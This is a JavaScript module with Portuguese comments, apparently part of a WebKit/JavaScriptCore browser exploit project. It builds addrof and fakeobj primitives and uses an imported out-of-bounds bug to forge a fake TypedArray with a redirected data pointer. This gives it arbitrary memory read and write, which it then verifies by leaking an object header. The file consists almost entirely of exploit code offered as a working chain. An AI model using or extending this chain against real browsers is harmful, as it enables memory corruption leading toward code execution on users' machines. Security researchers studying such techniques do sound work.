// js/script3/testArrayBufferVictimCrash.mjs (v96 - R60 Implementação Funcional Completa de L/E)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Implementação completa e funcional da primitiva de Leitura/Escrita Arbitrária.
// O script agora usa addrof/fakeobj para construir uma ferramenta de L/E universal
// a partir de um TypedArray falso com um butterfly modificado. A verificação final
// é um teste real da nova primitiva.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_FunctionalRW_v96_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FUNCIONAL)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Funcional de L/E ---`, "test");

    let final_result = { success: false, message: "A cadeia de L/E Arbitrária não obteve sucesso." };

    try {
        // --- FASE 1: Obtenção da primitiva OOB ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        logS3("Primitiva OOB está funcional.", "good");

        // --- FASE 2: Criando as Primitivas Base (addrof, fakeobj) ---
        logS3("--- FASE 2: Criando Primitivas 'addrof' e 'fakeobj'... ---", "subtest");
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3(`++++++++++++ SUCESSO! Primitivas 'addrof' e 'fakeobj' operacionais! ++++++++++++`, "vuln");

        // --- FASE 3: Construindo a Primitiva de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 3: Construindo ferramenta de L/E com TypedArray Falso ---", "subtest");

        const rw_driver_array = new Uint32Array(8);
        const rw_driver_addr = addrof(rw_driver_array);
        logS3(`Endereço do 'rw_driver_array' (molde): ${rw_driver_addr.toString(true)}`, "info");

        const fake_butterfly_buf = new ArrayBuffer(256);
        const fake_butterfly_addr = addrof(fake_butterfly_buf);
        logS3(`Buffer para o butterfly falso alocado em: ${fake_butterfly_addr.toString(true)}`, "info");

        const original_butterfly_addr = await arb_read(rw_driver_addr, 8);
        logS3(`Copiando butterfly de ${original_butterfly_addr.toString(true)} para ${fake_butterfly_addr.toString(true)}`, "info");
        for (let i = 0; i < 16; i += 8) {
            const read_addr = new AdvancedInt64(original_butterfly_addr.low() + i, original_butterfly_addr.high());
            let data = await arb_read(read_addr, 8);
            const write_addr = new AdvancedInt64(fake_butterfly_addr.low() + i, fake_butterfly_addr.high());
            await arb_write(write_addr, data, 8);
        }
        logS3("Butterfly original copiado para a área falsa.", "info");

        const fake_rw_driver = fakeobj(fake_butterfly_addr);
        logS3("TypedArray falso ('fake_rw_driver') criado com sucesso.", "vuln");

        const m_vector_addr_in_fake_butterfly = new AdvancedInt64(
            fake_butterfly_addr.low() + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET,
            fake_butterfly_addr.high()
        );

        const set_rw_addr = async (addr) => {
            await arb_write(m_vector_addr_in_fake_butterfly, addr, 8);
        };

        const arb_read_final = async (addr) => {
            await set_rw_addr(addr);
            const low = fake_rw_driver[0];
            const high = fake_rw_driver[1];
            if (typeof low !== 'number' || typeof high !== 'number') {
                throw new TypeError(`Leitura inválida do driver falso. Low: ${low}, High: ${high}`);
            }
            return new AdvancedInt64(low, high);
        };

        const arb_write_final = async (addr, value) => {
            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
            await set_rw_addr(addr);
            fake_rw_driver[0] = value.low();
            fake_rw_driver[1] = value.high();
        };
        logS3("++++++++++++ SUCESSO! Primitivas de Leitura/Escrita Arbitrária estão prontas! ++++++++++++", "vuln");

        // --- FASE 4: Verificação Funcional da Leitura Arbitrária ---
        logS3("--- FASE 4: Verificando a Leitura Arbitrária... ---", "subtest");
        const test_obj = { verification: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        logS3(`Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "info");
        
        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${test_obj_addr.toString(true)}...`, "info");
        const header_leaked = await arb_read_final(test_obj_addr);
        logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");

        if (header_leaked && !header_leaked.equals(0)) {
            logS3("VERIFICAÇÃO CONCLUÍDA! O valor lido não é nulo, indicando sucesso na leitura de memória.", "good");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária funcional."
            };
        } else {
            throw new Error("A verificação da leitura arbitrária falhou, o valor lido foi nulo ou inválido.");
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Arbitrary R/W' }
    };
}
